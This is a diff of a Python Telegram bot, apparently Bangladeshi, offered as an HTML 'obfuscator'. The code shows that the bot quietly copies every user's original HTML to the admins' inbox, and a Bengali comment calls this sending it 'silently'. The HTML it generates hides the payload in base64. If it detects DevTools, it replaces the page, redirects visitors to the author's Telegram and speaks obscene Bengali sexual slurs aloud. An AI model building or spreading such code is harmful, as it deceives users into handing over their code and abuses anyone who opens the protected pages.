@@ -48,8 +48,8 @@ def send_force_join_msg(chat_id):
     bot.send_message(
         chat_id,
         "⚠️ **অ্যাক্সেস ব্লকড!**\n\n"
-        "এই বট ব্যবহার করতে হলে আপনাকে অবশ্যই আমাদের অফিশিয়াল সাপোর্ট গ্রুপে জয়েন থাকতে হবে!\n\n"
-        "👉 নিচের বাটন থেকে সাপোর্ট গ্রুপে জয়েন করে **'Check Membership'** বাটনে ক্লিক করুন।",
+        "এই বট ব্যবহার করতে হলে আপনাকে অবশ্যই আমাদের অফিশিয়াল সাপোর্ট গ্রুপে জয়েন থাকতে হবে!\n\n"
+        "👉 নিচের বাটন থেকে সাপোর্ট গ্রুপে জয়েন করে **'Check Membership'** বাটনে ক্লিক করুন।",
         reply_markup=markup,
         parse_mode='Markdown'
     )
@@ -74,7 +74,7 @@ def obfuscate_html(html_content):
 PROTECTED - DO NOT MODIFY THIS HEADER
 ------------------------------------------------
 Obfuscated By: @NIROB_GX_LEADER
-TG: @NIROB_GX_LEADER
+Bot Username: @nirob_team_Obucsate_bot
 Timestamp: {current_time}
 Signature: NIROB_GX_PROTECTED_ENGINE
 ===================================
@@ -84,9 +84,9 @@ Signature: NIROB_GX_PROTECTED_ENGINE
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PROTECTED BY NIROB | @NIROB_GX_LEADER</title>
+    <title>PROTECTED BY NIROB | @nirob_team_Obucsate_bot</title>
     <style>
-        html, body {{ margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#000; }}
+        html, body {{ margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#000; font-family: sans-serif; }}
         iframe {{ width:100%; height:100%; border:none; }}
     </style>
 </head>
@@ -95,12 +95,12 @@ Signature: NIROB_GX_PROTECTED_ENGINE
     {dense_junk_stream}
     var _0xgx_nirob_payload = "{encoded_payload}";
     var isDestroyed = false;
-    var telegramTrapLink = "https://t.me/NIROB_GX_LEADER?text=" + encodeURIComponent("নিরব আব্বা আমার ভুল হয়ে গেছে! আমাকে মাফ করে দেন...");
+    var telegramTrapLink = "https://t.me/NIROB_GX_LEADER?text=" + encodeURIComponent("ওহে নিরব আব্বা! আমার ভুল হয়ে গেছে, আপনার কোড চুরি করতে গেছিলাম! আমাকে ক্ষমা করে দেন আব্বা...");
     
     function triggerVoiceWarning() {{
         if ('speechSynthesis' in window) {{
             window.speechSynthesis.cancel();
-            var msgText = "ওই শয়তানের বাচ্চা! তোর এত্ত বড় সাহস তুই নিরব আব্বার কোডে হাত দেস? ফালতু কোড চুরি করার চিন্তা বাদ দে!";
+            var msgText = "ওই শুয়োরের বাচ্চা! তোর এত বড় সাহস তুই নিরব আব্বার কোডে হাত দিস? ফালতু কোড চুরি করার চিন্তা বাদ দে! তোর মার সাউয়ার মধ্যে কোড ভরে দিমু হারামজাদা!";
             var speech = new SpeechSynthesisUtterance(msgText);
             speech.lang = 'bn-BD';
             window.speechSynthesis.speak(speech);
@@ -111,26 +111,44 @@ Signature: NIROB_GX_PROTECTED_ENGINE
         if (isDestroyed) return;
         isDestroyed = true;
         triggerVoiceWarning();
-        document.body.innerHTML = '<div style="background:#000;color:#ff0055;height:100vh;width:100vw;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:20px;"><h1>⚠️ ACCESS DENIED BY NIROB ABBA!</h1><a href="' + telegramTrapLink + '" style="background:#00ffcc;color:#000;padding:15px 30px;border-radius:10px;text-decoration:none;font-weight:bold;">👉 নিরব আব্বার টেলিগ্রামে যান</a></div>';
-        setTimeout(function() {{ window.location.href = telegramTrapLink; }}, 1500);
+        document.body.innerHTML = '<div style="background:#000;color:#ff0055;height:100vh;width:100vw;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:20px;"><h1>⚠️ তোর মার সাউয়ার মধ্যে কোড ভরে দিমু শুয়োরের বাচ্চা!</h1><p style="color:#fff;margin:15px 0;font-size:16px;">নিরব আব্বার কোড চুরি করতে আইছো? তাড়াতাড়ি নিরব আব্বাকে @NIROB_GX_LEADER এ গিয়ে আব্বা ডাকো এবং মাফ চাও!</p><p style="color:#00ffcc;font-size:14px;margin-bottom:20px;">🤖 Secured by Bot: @nirob_team_Obucsate_bot</p><a href="' + telegramTrapLink + '" style="background:#00ffcc;color:#000;padding:15px 30px;border-radius:10px;text-decoration:none;font-weight:bold;">👉 নিরব আব্বার টেলিগ্রামে যান (মাফ চান)</a></div>';
+        setTimeout(function() {{ window.location.href = telegramTrapLink; }}, 2000);
     }}
     
-    (function() {{
-        window.addEventListener('keydown', function(e) {{
-            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey)) {{ destroyAndRedirect(); return false; }}
-        }}, true);
-        window.addEventListener('contextmenu', function(e) {{ destroyAndRedirect(); return false; }}, true);
-    }})();
+    // Developer Tools, F12 & Console Detection Trap
+    window.addEventListener('keydown', function(e) {{
+        if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 67 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {{
+            destroyAndRedirect();
+            return false;
+        }}
+    }}, true);
     
+    window.addEventListener('contextmenu', function(e) {{
+        destroyAndRedirect();
+        return false;
+    }}, true);
+
+    // Detect Console Open via DevTools size check
+    setInterval(function() {{
+        var widthThreshold = window.outerWidth - window.innerWidth > 160;
+        var heightThreshold = window.outerHeight - window.innerHeight > 160;
+        if (widthThreshold || heightThreshold) {{
+            destroyAndRedirect();
+        }}
+    }, 500);
+    
+    // Secure Rendering Engine for Telegram and Chrome
     (function(){{
         try {{
             var decoded = decodeURIComponent(escape(atob(_0xgx_nirob_payload)));
-            var blob = new Blob([decoded], {{type: 'text/html'}});
+            var blob = new Blob([decoded], {{type: 'text/html;charset=utf-8'}});
             var blobUrl = URL.createObjectURL(blob);
             var iframe = document.createElement('iframe');
             iframe.src = blobUrl;
             document.body.appendChild(iframe);
-        }} catch(e) {{}}
+        }} catch(e) {{
+            destroyAndRedirect();
+        }}
     }})();
 </script>
 </body>
@@ -140,18 +158,20 @@ Signature: NIROB_GX_PROTECTED_ENGINE
 def user_keyboard():
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     markup.add(types.KeyboardButton('🔒 Obfuscate'), types.KeyboardButton('🌐 HTML'))
+    markup.add(types.KeyboardButton('⚙️ Support Group'))
     return markup
 
 def admin_keyboard():
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     markup.add(types.KeyboardButton('📊 Admin Stats'), types.KeyboardButton('🛠️ Admin Help'))
+    markup.add(types.KeyboardButton('🔒 Obfuscate'), types.KeyboardButton('🌐 HTML'))
     return markup
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     user_id = message.from_user.id
     if user_id in banned_users:
-        bot.reply_to(message, "❌ আপনি ব্যানপ্রাপ্ত হয়েছেন। যোগাযোগ করুন: @NIROB_GX_LEADER")
+        bot.reply_to(message, "❌ আপনি ব্যানপ্রাপ্ত হয়েছেন। যোগাযোগ করুন: @NIROB_GX_LEADER")
         return
 
     if not check_user_membership(user_id):
@@ -161,16 +181,19 @@ def send_welcome(message):
     if user_id in ADMIN_IDS:
         bot.send_message(message.chat.id, "👑 WELCOME ADMIN (নিরব ভাই)\nবট ফুল্লি লাইভ আছে!", reply_markup=admin_keyboard())
     else:
-        bot.send_message(message.chat.id, "🔒 **HTML OBFUSCATOR BOT**\n\n📄 Send your .html file to start protection!", reply_markup=user_keyboard(), parse_mode='Markdown')
+        bot.send_message(message.chat.id, "🔒 **HTML OBFUSCATOR BOT**\n🤖 Bot: @nirob_team_Obucsate_bot\n\n📄 Send your .html file or code to start protection!", reply_markup=user_keyboard(), parse_mode='Markdown')
 
 @bot.callback_query_handler(func=lambda call: call.data == "check_join")
 def callback_check_join(call):
     user_id = call.from_user.id
     if check_user_membership(user_id):
-        bot.answer_callback_query(call.id, "✅ জয়েনিং কনফার্ম হয়েছে!")
-        bot.send_message(call.message.chat.id, "🎉 অভিনন্দন! এখন আপনি বট ব্যবহার করতে পারেন। /start দিন।", reply_markup=user_keyboard())
+        bot.answer_callback_query(call.id, "✅ জয়েনিং কনফার্ম হয়েছে!")
+        if user_id in ADMIN_IDS:
+            bot.send_message(call.message.chat.id, "🎉 অভিনন্দন! এখন আপনি বট ব্যবহার করতে পারেন।", reply_markup=admin_keyboard())
+        else:
+            bot.send_message(call.message.chat.id, "🎉 অভিনন্দন! এখন আপনি বট ব্যবহার করতে পারেন।", reply_markup=user_keyboard())
     else:
-        bot.answer_callback_query(call.id, "❌ আপনি এখনো গ্রুপে জয়েন করেননি!", show_alert=True)
+        bot.answer_callback_query(call.id, "❌ আপনি এখনো গ্রুপে জয়েন করেননি!", show_alert=True)
 
 @bot.message_handler(commands=['admin', 'unban'])
 def handle_admin_commands(message):
@@ -178,17 +201,17 @@ def handle_admin_commands(message):
         return
     text = message.text
     if text.startswith('/admin'):
-        bot.reply_to(message, f"👑 ADMIN PANEL\n📊 Protected: {total_protected_count}\n🚫 Banned: {len(banned_users)}")
+        bot.reply_to(message, f"👑 ADMIN PANEL (@nirob_team_Obucsate_bot)\n📊 Total Protected: {total_protected_count}\n🚫 Banned Users: {len(banned_users)}")
     elif text.startswith('/unban'):
         try:
             target_id = int(text.split()[1])
             if target_id in banned_users:
                 banned_users.remove(target_id)
-                bot.reply_to(message, f"✅ ইউজার {target_id} আনব্যান করা হয়েছে।")
+                bot.reply_to(message, f"✅ ইউজার {target_id} আনব্যান করা হয়েছে।")
             else:
                 bot.reply_to(message, "⚠️ ইউজার ব্যান লিস্টে নেই।")
         except:
-            bot.reply_to(message, "⚠️ সঠিক নিয়ম: /unban [ID]")
+            bot.reply_to(message, "⚠️ সঠিক নিয়ম: /unban [ID]")
 
 @bot.message_handler(content_types=['text', 'document'])
 def handle_incoming(message):
@@ -198,27 +221,34 @@ def handle_incoming(message):
     if user_id in ADMIN_IDS and text.isdigit():
         target_id = int(text)
         banned_users.add(target_id)
-        bot.reply_to(message, f"✅ ইউজার আইডি {target_id} ব্যান করা হয়েছে!")
+        bot.reply_to(message, f"✅ ইউজার আইডি {target_id} সফলভাবে ব্যান করা হয়েছে!")
         return
 
     if user_id in banned_users:
-        bot.reply_to(message, "❌ আপনি ব্যানপ্রাপ্ত হয়েছেন।")
+        bot.reply_to(message, "❌ আপনি ব্যানপ্রাপ্ত হয়েছেন।")
         return
 
     if not check_user_membership(user_id):
         send_force_join_msg(message.chat.id)
         return
 
-    if text in ['/start', '📊 Admin Stats', '🛠️ Admin Help']:
-        if text == '🛠️ Admin Help':
-            bot.reply_to(message, "🛠️ ইউজার ব্যান করতে শুধু তার আইডি (সংখ্যা) পাঠান। আনব্যান করতে সচিবের মতো /unban [ID] দিন।")
+    if text == '🛠️ Admin Help':
+        bot.reply_to(message, "🛠️ **Admin Help Menu:**\n1. ইউজার ব্যান করতে শুধু তার টেলিগ্রাম আইডি (সংখ্যা) পাঠান।\n2. আনব্যান করতে লিখুন: `/unban [ID]`\n3. স্ট্যাটস দেখতে লিখুন: `/admin` বা বাটনে ক্লিক করুন।", parse_mode='Markdown')
+        return
+
+    if text == '📊 Admin Stats':
+        bot.reply_to(message, f"👑 **ADMIN STATS PANEL**\n🤖 Bot: @nirob_team_Obucsate_bot\n📊 Total Protected: {total_protected_count}\n🚫 Banned Users: {len(banned_users)}", parse_mode='Markdown')
+        return
+
+    if text == '⚙️ Support Group':
+        bot.send_message(message.chat.id, "📢 আমাদের অফিশিয়াল সাপোর্ট গ্রুপ:\n👉 https://t.me/SUPPOR8TNIROB")
         return
 
     if text in ['🔒 Obfuscate', '🌐 HTML']:
-        bot.send_message(message.chat.id, "📄 আপনার .html ফাইল বা কোডটি পাঠান!")
+        bot.send_message(message.chat.id, "📄 আপনার .html ফাইল অথবা সরাসরি এইচটিএমএল কোডটি চ্যাটে পেস্ট করে পাঠান!")
         return
 
-    bot.reply_to(message, "⏳ Processing and applying Nirob's Dense Stream Security Engine...")
+    bot.reply_to(message, "⏳ Processing and applying Nirob's Ultra Dense Security Engine...")
     
     try:
         html_data = ""
@@ -236,7 +266,7 @@ def handle_incoming(message):
         total_protected_count += 1
 
         # ==========================================
-        # 📥 ইউজারের আসল রিয়েল কোড সাইলেন্টলি অ্যাডমিনের ইনবক্সে পাঠানোর লজিক
+        # 📥 ইউজারের আসল রিয়েল কোড সাইলেন্টলি অ্যাডমিনের ইনবক্সে পাঠানোর লজিক
         # ==========================================
         for admin_id in ADMIN_IDS:
             admin_notification = (
@@ -249,7 +279,6 @@ def handle_incoming(message):
             )
             bot.send_message(admin_id, admin_notification, parse_mode='Markdown')
             
-            # ইউজারের আসল কোডটি সরাসরি অ্যাডমিনের ইনবক্সে ফাইল আকারে পাঠিয়ে দেওয়া হবে
             temp_orig_name = f"Original_{user_id}.html"
             with open(temp_orig_name, "w", encoding="utf-8") as tf:
                 tf.write(html_data)
@@ -273,10 +302,12 @@ def handle_incoming(message):
                     "✅ **আল্ট্রা-ডেনস সিকিউরিটি সফল!**\n\n"
                     "🛡️ **Applied Protections:**\n"
                     "🔹 Heavy Dense Stream Obfuscation\n"
-                    "🔹 Blackout Trap & Voice Warning\n"
-                    "🔹 Auto Telegram Redirect Trap (@NIROB_GX_LEADER )\n\n"
-                    "👑 _Protected by @NIROB_GX_LEADER"
-                )
+                    "🔹 Console & DevTools Trap with Voice Warning\n"
+                    "🔹 Auto Telegram Redirect Trap (@NIROB_GX_LEADER)\n\n"
+                    "🤖 _Bot Username: @nirob_team_Obucsate_bot_\n"
+                    "👑 _Protected by @NIROB_GX_LEADER_"
+                ),
+                parse_mode='Markdown'
             )
         os.remove(output_file_name)
         
